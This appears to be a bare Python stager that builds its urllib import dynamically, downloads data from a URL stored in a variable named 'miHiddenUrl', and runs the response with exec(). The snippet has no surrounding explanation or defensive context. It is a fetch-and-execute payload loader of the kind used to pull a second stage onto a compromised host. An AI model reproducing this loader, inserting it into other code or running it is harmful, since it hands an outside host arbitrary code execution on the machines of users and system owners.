import sys
u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',))
r=u.urlopen(miHiddenUrl)
exec(r.read())